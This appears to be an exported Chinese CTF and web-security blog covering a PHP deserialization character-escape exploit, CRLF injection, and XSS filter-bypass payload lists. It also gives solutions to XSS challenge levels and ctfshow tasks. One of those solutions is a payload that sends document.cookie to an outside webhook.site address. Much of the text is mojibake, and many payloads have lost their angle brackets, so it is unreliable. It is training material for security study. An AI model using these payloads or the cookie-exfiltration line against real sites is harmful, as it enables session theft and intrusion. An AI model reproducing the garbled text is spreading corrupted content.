@link: https://ctfer.com*/error_reporting(0);class message public $from; public $msg; public $to; public $token=user; public function __construct($f,$m,$t) $this-from = $f; $this-msg = $m; $this-to = $t; $f = $_GET[f];$m = $_GET[m];$t = $_GET[t];if(isset($f) isset($m) isset($t)) $msg = new message($f,$m,$t); $umsg = str_replace(fuck, loveU, serialize($msg)); setcookie(msg,base64_encode($umsg)); echo Your message has been sent;highlight_file(__FILE__); æ³¨é‡Šä¸­è¿˜æœ‰message.phpç•Œé¢ï¼Œè®¿é—®å¾—åˆ°å¦‚ä¸‹ä»£ç ï¼š ?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 15:13:03# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);include(flag.php);class message public $from; public $msg; public $to; public $token=user; public function __construct($f,$m,$t) $this-from = $f; $this-msg = $m; $this-to = $t; if(isset($_COOKIE[msg])) $msg = unserialize(base64_decode($_COOKIE[msg])); if($msg-token==admin) echo $flag; ä»ä¸Šè¿°ä»£ç å¯ä»¥æ˜ç™½è¦å¾—åˆ°flagï¼Œtokenå€¼è¦ç­‰äºadmin ä½†æ˜¯åˆå§‹çš„tokenå€¼æ˜¯é»˜è®¤ç­‰äºuserçš„ï¼Œæˆ‘ä»¬æ”¹ä¸äº†ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°$umsg = str_replace(fuck, loveU, serialize($msg));æ˜¯å­—ç¬¦æ›¿æ¢ï¼Œå¯ä»¥å®ç°å­—ç¬¦é€ƒé€¸ å®ç°å­—ç¬¦é€ƒé€¸ï¼š æ‰€éœ€é€ƒé€¸çš„ä¸ºï¼š;s:5:token;s:5:admin;ä¸€å…±27ä¸ªå­—ç¬¦ï¼Œæ„é€ 27ä¸ªfuckt=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck;s:5:token;s:5:admin; æ‰€ä»¥æˆ‘ä»¬çš„payloadä¸ºï¼š?f=1m=1t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck;s:5:token;s:5:admin; ç„¶åè®¿é—®message.phpé¡µé¢ï¼Œä½†æ˜¯æ²¡æœ‰è§åˆ°flag è¿™æ˜¯æˆ‘ä»¬éœ€è¦æ”¹ä¸€ä¸‹cookieçš„è·¯å¾„ï¼Œæ”¹ä¸º/message.phpå¦‚ä¸‹ï¼š ä¿å­˜å¹¶é‡æ–°åˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼Œå¾—åˆ°flagï¼Œé¢˜ç›®è§£å†³","tags":["php","web"],"categories":["CTF"]},{"title":"xsså­¦ä¹ ","path":"/2024/02/10/xsså­¦ä¹ _max/xsså­¦ä¹ /","content":"åŸºç¡€ç®€ä»‹ç½‘ç«™ä¸­åŒ…å«å¤§é‡çš„åŠ¨æ€å†…å®¹ä»¥æé«˜ç”¨æˆ·ä½“éªŒï¼Œæ¯”è¿‡å»è¦å¤æ‚å¾—å¤šã€‚æ‰€è°“åŠ¨æ€å†…å®¹ï¼Œå°±æ˜¯æ ¹æ®ç”¨æˆ·ç¯å¢ƒå’Œéœ€è¦ï¼ŒWebåº”ç”¨ç¨‹åºèƒ½å¤Ÿè¾“å‡ºç›¸åº”çš„å†…å®¹ã€‚åŠ¨æ€ç«™ç‚¹ä¼šå—åˆ°ä¸€ç§åä¸ºâ€œè·¨ç«™è„šæœ¬æ”»å‡»â€çš„å¨èƒï¼Œè€Œé™æ€ç«™ç‚¹åˆ™å®Œå…¨ä¸å—å…¶å½±å“ã€‚æ¶æ„æ”»å‡»è€…ä¼šåœ¨ Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•° åˆ†ç±»åå°„å‹XSSï¼šéæŒä¹…åŒ– æ”»å‡»è€…äº‹å…ˆåˆ¶ä½œå¥½æ”»å‡»é“¾æ¥, éœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚DOMå‹XSSç”±äºå±å®³è¾ƒå°ï¼Œæˆ‘ä»¬å°†å…¶å½’ä¸ºåå°„å‹XSS å­˜å‚¨å‹XSSï¼šæŒä¹…åŒ– ä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§XSSéå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒcookie(è™½ç„¶è¿˜æœ‰ç§DOMå‹XSSï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯åŒ…æ‹¬åœ¨å­˜å‚¨å‹XSSå†…) domå‹ä¸åå°„å‹çš„åŒºåˆ«ï¼š åœ¨domå‹ä¸­è¾“å…¥çš„å†…å®¹å¹¶ä¸ä¼šå‡ºç°åœ¨å“åº”ä½“é‡Œé¢ï¼ˆæºç é‡Œé¢ä¹Ÿä¸ä¼šï¼‰ å“åº”ä½“æ˜¯æˆ‘çš„è¾“å…¥ä¼šç»è¿‡åç«¯ï¼Œç»è¿‡åç«¯æ¸²æŸ“åå†è¿”å›åˆ°å‰ç«¯ï¼›domå‹æ˜¯ç›´æ¥é€šè¿‡å‰ç«¯çš„jsä»£ç æŠŠæˆ‘çš„è¾“å…¥æ’å…¥åˆ°é¡µé¢ä¸­è¿›è¡Œå®æ—¶æ¸²æŸ“ï¼Œè¿™ä¸ªæ—¶å€™å¹¶ä¸æ˜¯åç«¯ååº”ç»™æˆ‘çš„ï¼Œdomå‹æ²¡æœ‰å‘åç«¯å‘èµ·ä»»ä½•è¯·æ±‚ï¼Œè€ŒæŒ‰F12å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å†…å®¹æ’å…¥åˆ°æºç ä¸­æ˜¯å› ä¸ºå…¶è¿”å›çš„æ˜¯å®æ—¶æ¸²æŸ“çš„ç»“æœ è¡¥å……jsä¼ªåè®®ï¼šå°±æ˜¯æŠŠjavascript: :åé¢çš„ä»£ç å½“JavaScriptæ¥æ‰§è¡Œ ä½¿ç”¨htmlspecialcharså‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ã€â€ã€ â€™ã€ã€è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´  ä½†æ˜¯é»˜è®¤æ˜¯åªç¼–ç åŒå¼•å·çš„ï¼Œè€Œä¸”å•å¼•å·æ— è®ºå¦‚ä½•éƒ½ä¸è½¬ä¹‰ã€‚ é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š - ï¼ˆå’Œå·ï¼‰æˆä¸º amp;- ï¼ˆåŒå¼•å·ï¼‰æˆä¸º quot;- ï¼ˆå•å¼•å·ï¼‰æˆä¸º - ï¼ˆå°äºï¼‰æˆä¸º lt;- ï¼ˆå¤§äºï¼‰æˆä¸º gt; CRLFæ³¨å…¥æ¼æ´è¿™ä¹Ÿå°±ç‰µæ‰¯åˆ°CRLFæ¼æ´äº† åœ¨ HTTP åè®®ä¸­ï¼ŒCRLF è¢«ç”¨æ¥åˆ†éš” HTTP è¯·æ±‚å’Œå“åº”ä¸­çš„å„ä¸ªéƒ¨åˆ†ã€‚ CRLF æ˜¯å›è½¦ç¬¦ï¼ˆcarriage returnï¼ŒCRï¼‰å’Œæ¢è¡Œç¬¦ï¼ˆline feedï¼ŒLFï¼‰çš„ç¼©å†™ï¼Œå®ƒä»¬é€šå¸¸è¢«ä¸€èµ·ä½¿ç”¨æ¥è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸã€‚CRLF æ¼æ´ï¼ˆä¹Ÿç§°ä¸º HTTP æŠ¥å¤´æ³¨å…¥æ¼æ´ï¼‰æ˜¯ä¸€ç§ Web åº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å‘ HTTP å“åº”ä¸­æ³¨å…¥ä»»æ„çš„ HTTP å¤´æˆ–è€…å“åº”ä½“ï¼Œä¸€èˆ¬æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨è¾“å…¥ä¸­æ³¨å…¥ CRLF å­—ç¬¦æ¥æ”¹å˜ HTTP å“åº”çš„å†…å®¹ï¼Œä»è€Œå®ç°æ¶æ„æ“ä½œã€‚ æ¯”å¦‚æœ‰ä¸€ä¸ªæœç´¢å…³é”®è¯çš„ç½‘ç«™åˆ©ç”¨GETçš„å½¢å¼ä¼ å‚ exp:?key=aaa å¦‚æœè¯¥ç½‘ç«™å­˜åœ¨CRLFæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å›è½¦ç¬¦æ¢è¡Œç¬¦è¿›è¡Œç»•è¿‡è¿‡æ»¤ ?key=%0d%0a%0d%0aimg src=1 onerror=alert(1) æˆ‘ä»¬æŠ“ä¸€ä¸‹åŒ…çœ‹ä¸€ä¸‹è¿”å›åŒ… HTTP/1.1 200 OKDate:xxxxxxxxxxContent-type:text/htmlContet-Length:xxxConnection:closeLocation:img src=1 onerror=alert(/xss/) æµè§ˆå™¨ä¼šæ ¹æ®ç¬¬ä¸€ä¸ªCRLFæŠŠHTTPåŒ…åˆ†æˆheaderå’Œbodyï¼Œç„¶åå°†ä½“æ˜¾ç¤ºå‡ºæ¥ã€‚äºæ˜¯æˆ‘ä»¬è¿™é‡Œè¿™ä¸ªæ ‡ç­¾å°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œé€ æˆä¸€ä¸ªXSS æµè§ˆå™¨çš„Filteræ˜¯æµè§ˆå™¨åº”å¯¹ä¸€äº›åå°„å‹XSSåšçš„ä¿æŠ¤ç­–ç•¥ï¼Œå½“urlä¸­å«æœ‰XSSç›¸å…³ç‰¹å¾çš„æ—¶å€™å°±ä¼šè¿‡æ»¤æ‰ä¸æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œæ‰€ä»¥ä¸èƒ½è§¦å‘XSSã€‚ æ€æ ·æ‰èƒ½å…³æ‰filterï¼Ÿä¸€èˆ¬æ¥è¯´ç”¨æˆ·è¿™è¾¹æ˜¯ä¸è¡Œçš„ï¼Œåªæœ‰æ•°æ®åŒ…ä¸­httpå¤´å«æœ‰X-XSS-Protectionå¹¶ä¸”å€¼ä¸º0çš„æ—¶å€™ï¼Œæµè§ˆå™¨æ‰ä¸ä¼šå¼€å¯filterã€‚ æˆ‘ä»¬å¯ä»¥å°†X-XSS-Protection:0æ³¨å…¥åˆ°æ•°æ®åŒ…ä¸­ï¼Œå†ç”¨ä¸¤ä¸ªCRLFæ¥æ³¨å…¥XSSä»£ç ï¼Œè¿™æ ·å°±æˆåŠŸåœ°ç»•è¿‡äº†æµè§ˆå™¨filterï¼Œå¹¶ä¸”æ‰§è¡Œæˆ‘ä»¬çš„åå°„å‹XSS ç»•è¿‡å§¿åŠ¿æ‹¼æ¥ç»•è¿‡eval img src=x onerror=eval(al+ert(Evi1s7)) top img src=x onerror=top[al+ert](Evi1s7) window img src=x onerror=window[al+ert](1) self img src=x onerror=self[`al`+`ert`](1) parent img src=x onerror=parent[`al`+`ert`](1) frames img src=x onerror=frames[`al`+`ert`](1) å‡½æ•°æ›¿æ¢img src=x onerror=eval(alert(1))img src=x onerror=open(alert(1))img src=x onerror=document.write(alert(1))img src=x onerror=setTimeout(alert(1))img src=x onerror=setInterval(alert(1))img src=x onerror=Set.constructor(alert(1))img src=x onerror=Map.constructor(alert(1))img src=x onerror=Array.constructor(alert(1))img src=x onerror=WeakSet.constructor(alert(1))img src=x onerror=constructor.constructor(alert(1))img src=x onerror=[1].map(alert(1))img src=x onerror=[1].find(alert(1))img src=x onerror=[1].every(alert(1))img src=x onerror=[1].filter(alert(1))img src=x onerror=[1].forEach(alert(1))img src=x onerror=[1].findIndex(alert(1)) ä»¥ä¸Šåªæ˜¯åˆ©ç”¨imgæ ‡ç­¾è¿›è¡Œä¸¾ä¾‹ï¼Œä¹Ÿå¯ä»¥åœ¨åˆ«çš„æ ‡ç­¾ä¸­ä½¿ç”¨ åµŒå¥—ç»•è¿‡scscriptriptalert(Evi1s7)/sc/scriptript åœ¨è¿™ä¸€æ®µä»£ç ä¸­ï¼Œç”±äºæ ‡ç­¾åè¢«æ‹†åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œæµè§ˆå™¨ä¼šå°†ç¬¬ä¸€ä¸ªå°–æ‹¬å·è§†ä¸ºæ ‡ç­¾åçš„èµ·å§‹ç¬¦å·ï¼Œè€Œç¬¬äºŒä¸ªå°–æ‹¬å·åˆ™æ˜¯script æ ‡ç­¾çš„èµ·å§‹ç¬¦å·ï¼Œå¯¼è‡´æµè§ˆå™¨è¯¯ä»¥ä¸ºæœ‰ä¸¤ä¸ªæ ‡ç­¾è¢«åµŒå¥—åœ¨ä¸€èµ·ï¼Œä»è€Œå®ç°æˆ‘ä»¬çš„XSSæ”»å‡» urlç¼–ç ç»•è¿‡éœ€è¦æ³¨å…¥ç‚¹å­˜åœ¨hrefå±æ€§æˆ–è€…srcå±æ€§ï¼Œæ‰å¯ä»¥åˆ©ç”¨urlç¼–ç è½¬ä¹‰ ï¼ˆæ³¨æ„åœ¨urlè§£æè¿‡ç¨‹ä¸­ï¼Œä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼‰ a href=javascript:alert(1)Evi1s7/a#a href=javascript:%61%6c%65%72%74%28%31%29Evi1s7/a scrå’Œhrefå±æ€§1.srcå±æ€§æ€»çš„æ¥è¯´ï¼Œsrcå±æ€§é€šå¸¸ç”¨äºæŒ‡å®šå¤–éƒ¨èµ„æºçš„URLï¼Œè®©æµè§ˆå™¨ä»æŒ‡å®šçš„URLä¸­è·å–èµ„æºå¹¶åŠ è½½å®ƒä»¬ã€‚ scriptæ ‡ç­¾ srcå±æ€§ç”¨äºæŒ‡å®šå¼•å…¥å¤–éƒ¨JavaScriptæ–‡ä»¶çš„URL imgæ ‡ç­¾ srcå±æ€§ç”¨äºæŒ‡å®šè¦æ˜¾ç¤ºçš„å›¾åƒçš„URL iframeæ ‡ç­¾ srcå±æ€§ç”¨äºæŒ‡å®šè¦åµŒå…¥çš„å¦ä¸€ä¸ªæ–‡æ¡£çš„URLã€‚ audioå’Œvideoæ ‡ç­¾ srcå±æ€§ç”¨äºæŒ‡å®šè¦æ’­æ”¾çš„éŸ³é¢‘æˆ–è§†é¢‘çš„URL audio controls source src=path/to/your/audio.mp3 type=audio/mp3/audiovideo controls source src=path/to/your/video.mp4 type=video/mp4/video 2.hrefå±æ€§æ€»çš„æ¥è¯´ï¼Œhrefå±æ€§é€šå¸¸ç”¨äºæŒ‡å®šé“¾æ¥ç›®æ ‡çš„URLæˆ–å¤–éƒ¨èµ„æºçš„URLï¼Œä»¥åŠç”¨äºæŒ‡å®šåŸºå‡†URLæˆ–å›¾åƒåœ°å›¾ä¸­åŒºåŸŸçš„URLã€‚ aæ ‡ç­¾ hrefå±æ€§ç”¨äºæŒ‡å®šé“¾æ¥ç›®æ ‡çš„URLã€‚ linkæ ‡ç­¾ hrefå±æ€§ç”¨äºæŒ‡å®šå¤–éƒ¨æ ·å¼è¡¨çš„URLã€‚ link rel=stylesheet type=text/css href=path/to/your/stylesheet.css baseæ ‡ç­¾ hrefå±æ€§ç”¨äºæŒ‡å®šåŸºå‡†URLï¼Œæ‰€æœ‰ç›¸å¯¹URLéƒ½å°†ä»¥è¯¥URLä¸ºåŸºç¡€ã€‚ base href=https://www.example.com/a href=path/to/your/page.htmlLink Text/a areaæ ‡ç­¾ hrefå±æ€§ç”¨äºæŒ‡å®šå›¾åƒåœ°å›¾ä¸­åŒºåŸŸçš„URLã€‚ img src=path/to/your/image.jpg alt=Your Image usemap=#your-mapmap name=your-map area shape=rect coords=0,0,100,100 href=path/to/your/page.html/map ()ç»•è¿‡1.åˆ©ç”¨åå¼•å· scriptalert`1`/script 2.throwç»•è¿‡ scriptalert;throw 1/scriptsvg/onload=window.onerror=eval;throw=alert\\x281\\x29; å•å¼•å·è¿‡æ»¤1.å¯ä»¥åˆ©ç”¨æ–œæ æ›¿æ¢ scriptalert(/Evi1s7/)/script 2.åˆ©ç”¨åå¼•å·æ›¿æ¢ scriptalert(`Evi1s7`)/script é•¿åº¦é™åˆ¶å¯ä»¥åˆ©ç”¨æ‹†åˆ†æ³• scripta=document.write(/scriptscripta=a+a href=ht/scriptscripta=a+tp://VPS-IP:po/scriptscripta=a+rtEvi1s7/a)/scriptscripteval(a)/script åˆ©ç”¨eval()å‡½æ•°å°†å­—ç¬¦ä¸²è§£æä¸ºå¯æ‰§è¡Œçš„ä»£ç ï¼Œä»è€Œè¿›è¡Œæ‹¼æ¥ document.write(a href=http://VPS-IP:portEvi1s7/a) åˆ†å·ç»•è¿‡å½“åªè¿‡æ»¤äº†åˆ†å·æ—¶ï¼Œå¯ä»¥åˆ©ç”¨èŠ±æ‹¬å·è¿›è¡Œè¯­å¥éš”ç¦» scriptonerror=alertthrow 1/script xssæŒ‘æˆ˜ä¹‹æ—…é¶åœºï¼šhttp://test.ctf8.com/ level-1?php ini_set(display_errors, 0);$str = $_GET[name];echo h2 align=centeræ¬¢è¿ç”¨æˆ·.$str./h2;? æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ï¼š/level1.php?name=scriptalert(1)/scriptï¼Œå¼¹å‡ºå¼¹çª—ï¼Œè¿›å…¥ä¸‹ä¸€å…³ level-2$str = $_GET[keyword];echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level2.php method=GETinput name=keyword value=.$str.input type=submit name=submit value=æœç´¢/ $strè¢«åŒå¼•å·åŒ…å«ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆåŒ…å«åŒå¼•å·åå†xssï¼šscriptalert(1)/scriptï¼Œæˆ–è€… scriptalert(1)/script å¼¹å‡ºå¼¹çª—ï¼Œè¿›å…¥ä¸‹ä¸€å…³ level-3$str = $_GET[keyword];echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level3.php method=GETinput name=keyword value=.htmlspecialchars($str). payloadï¼šonclick=alert(1)rç„¶åå†ç‚¹å‡»ä¸€ä¸‹è¾“å…¥æ¡†å°±æˆåŠŸäº† input name=keyword value=onclick=alert(1) level-4$str = $_GET[keyword];$str2=str_replace(,,$str);$str3=str_replace(,,$str2);echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level4.php method=GETinput name=keyword value=.$str3. payloadï¼šonclick=alert(1) level-5$str = strtolower($_GET[keyword]);$str2=str_replace(script,scr_ipt,$str);$str3=str_replace(on,o_n,$str2);echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level5.php method=GETinput name=keyword value=a href=javascript:alert(1) payloadï¼ša href=javascript:alert(1)ï¼Œåˆ©ç”¨æµè§ˆå™¨è‡ªåŠ¨æ ¡æ­£è½»å¾®è¯­æ³•é”™è¯¯ level-6$str = $_GET[keyword];$str2=str_replace(script,scr_ipt,$str);$str3=str_replace(on,o_n,$str2);$str4=str_replace(src,sr_c,$str3);$str5=str_replace(data,da_ta,$str4);$str6=str_replace(href,hr_ef,$str5);echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level6.php method=GETinput name=keyword value=.$str6. è¯¥é¢˜æœ‰å¤šç§payloadï¼ŒåŸºæœ¬ä¸Šåªè¦æŠŠå‰å‡ é¢˜æ”¹ä¸‹å¤§å°å†™å°±å¯ä»¥äº† level-7$str =strtolower( $_GET[keyword]);$str2=str_replace(script,,$str);$str3=str_replace(on,,$str2);$str4=str_replace(rcs,,$str3);$str5=str_replace(data,,$str4);$str6=str_replace(href,,$str5);echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform action=level7.php method=GETinput name=keyword value=.$str6. å…¨è½¬æ¢æˆå°å†™äº†ï¼Œå¤§å°å†™ä¸ç®¡ç”¨ï¼Œä½†æ˜¯å¯ä»¥åŒå†™ç»•è¿‡ï¼šscrscriptiptalert(1)/scrscriptipt level-8ï¼ˆHTMLå®ä½“ç»•è¿‡ï¼‰$str = strtolower($_GET[keyword]);$str2=str_replace(script,scr_ipt,$str);$str3=str_replace(on,o_n,$str2);$str4=str_replace(src,sr_c,$str3);$str5=str_replace(data,da_ta,$str4);$str6=str_replace(href,hr_ef,$str5);$str7=str_replace(,quot,$str6);echo centerBRa href=.$str7.å‹æƒ…é“¾æ¥/a/center; å¯ä»¥ç”¨HTMLå®ä½“æ¥ç»•è¿‡è¿‡æ»¤: #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#49;#41; HTMLå®ä½“ï¼šå­—ç¬¦å®ä½“æ˜¯ç”¨ä¸€ä¸ªç¼–å·å†™å…¥HTMLä»£ç ä¸­æ¥ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘é¡µæ—¶ä¼šå°†è¿™ä¸ªç¼–å·è§£æè¿˜åŸä¸ºå­—ç¬¦ä»¥ä¾›é˜…è¯» level-9ï¼ˆhttpï¼‰$str = strtolower($_GET[keyword]);$str2=str_replace(script,scr_ipt,$str);$str3=str_replace(on,o_n,$str2);$str4=str_replace(src,sr_c,$str3);$str5=str_replace(data,da_ta,$str4);$str6=str_replace(href,hr_ef,$str5);$str7=str_replace(,quot,$str6);if(false===strpos($str7,http://))echo centerBRa href=æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼å‹æƒ…é“¾æ¥/a/center;elseecho centerBRa href=.$str7.å‹æƒ…é“¾æ¥/a/center; åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šå†æ·»ä¸Š //http://å°±å¯ä»¥äº† #106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#49;#41;//http:// level-10$str = $_GET[keyword];$str11 = $_GET[t_sort];$str22=str_replace(,,$str11);$str33=str_replace(,,$str22);echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform id=searchinput name=t_link value=. type=hiddeninput name=t_history value=. type=hiddeninput name=t_sort value=.$str33. type=hidden å½“ä¸€ä¸ªinputå…ƒç´ é‡Œé¢æœ‰ä¸¤ä¸ªtypeæ—¶ï¼Œé‚£ä¹ˆåªæœ‰ç¬¬ä¸€ä¸ª type å±æ€§ä¼šè¢«æµè§ˆå™¨è§£æï¼Œè€Œç¬¬äºŒä¸ª type å±æ€§ä¼šè¢«å¿½ç•¥ payloadï¼št_sort=type=textonclick=alert(1) level-11$str = $_GET[keyword];$str00 = $_GET[t_sort];$str11=$_SERVER[HTTP_REFERER];$str22=str_replace(,,$str11);$str33=str_replace(,,$str22);echo h2 align=centeræ²¡æœ‰æ‰¾åˆ°å’Œ.htmlspecialchars($str).ç›¸å…³çš„ç»“æœ./h2.centerform id=searchinput name=t_link value=. type=hiddeninput name=t_history value=. type=hiddeninput name=t_sort value=.htmlspecialchars($str00). type=hiddeninput name=t_ref value=.$str33. type=hidden åœ¨refereré‡Œé¢è¿›è¡Œä¿®æ”¹å°±è¡Œï¼štype=textonclick=alert(1) level-12å’Œä¸Šé¢˜ä¸åŒçš„æ˜¯è¦åœ¨User-Agenté‡Œé¢æ”¹ level-13è¿™é¢˜åœ¨cookieé‡Œé¢æ”¹å°±å¯ä»¥äº† type=textonclick=alert(1)æˆ–è€… type=text onmousemove=alert(1) level-14è€ƒåˆ°äº†æ‚é¡¹ï¼Œä¸ä¼š level-15ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰?php ini_set(display_errors, 0);$str = $_GET[src];echo bodyspan class=ng-include:.htmlspecialchars($str)./span/body;? ng-includeæŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ ng-includeå±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ æ‰€ä»¥è¿™é¢˜æˆ‘ä»¬åªéœ€è¦åŒ…å«ç¬¬ä¸€é¢˜çš„æ¼æ´å°±å¥½äº†ï¼šsrc=level1.php?name=img src=1 onerror=alert(1) level-16ï¼ˆæ›¿æ¢ç©ºæ ¼ï¼‰$str = strtolower($_GET[keyword]);$str2=str_replace(script, ,$str);$str3=str_replace( , ,$str2);$str4=str_replace(/, ,$str3);$str5=str_replace(\t, ,$str4);echo center.$str5./center; 1ã€â€œ0Dâ€æ˜¯æŠŠå…‰æ ‡ç§»åˆ°åŒä¸€è¡Œçš„é¡¶å¤´â€”â€”å›è½¦(CR)ã€‚ 2ã€â€œ0Aâ€æ˜¯æŠŠå…‰æ ‡ç§»åˆ°ä¸‹ä¸€è¡Œâ€”â€”æ¢è¡Œ(LF)ã€‚ 3ã€ç”¨â€œâ€ä»£æ›¿ç©ºæ ¼ ä½¿ç”¨æ›¿èº«ï¼Œå°±æ˜¯å°†%0aæˆ–è€…%0Då½“æˆç©ºæ ¼ä½¿ç”¨ï¼Œåœ¨HTMLä¸­è¿™æ ·æ˜¯åˆæ³•çš„ payloadï¼šimg%0dsrc=1%0donerror=alert(1) CTF.showweb316-web319é™¤äº†316å¤–åé¢å‡ é¢˜è¿‡æ»¤äº† javascriptï¼Œæ‰€ä»¥è§£é¢˜å¦‚ä¸‹ï¼š body onload=window.open(https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=+document.cookie) web320-web326å¯ä»¥é€šè¿‡åœ¨è¾“å…¥æ¡†è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼ˆæ¯”å¦‚ï¼šæˆ‘è¾“å…¥äº†scriptï¼‰ï¼Œç„¶åæŸ¥çœ‹å›æ˜¾ï¼Œæœ‰å›æ˜¾è¯´æ˜æ²¡æœ‰è¢«è¿‡æ»¤æ‰ï¼Œæ— å›æ˜¾è¯´æ˜è¢«è¿‡æ»¤æ‰äº† web320: é€šè¿‡æŸ¥çœ‹ç½‘å€å‘ç°ç©ºæ ¼è¢«æ›¿æ¢æˆäº†åŠ å·ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ç”¨æˆ–è€…**æ¥ä»£æ›¿ç©ºæ ¼ï¼Œæ‰€ä»¥è§£é¢˜å¦‚ä¸‹ï¼š body onload=window.open(https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=+document.cookie) åé¢å‡ é¢˜éƒ½å¯ä»¥ç”¨ä¸Šè¿°çš„æ–¹æ³• web327å‘ä¿¡äººå¿…é¡»æ˜¯adminï¼Œç„¶åä¿¡çš„å†…å®¹æ˜¯xssçš„å†…å®¹å°±å¥½äº† CTFHub-XSSåå°„å‹ 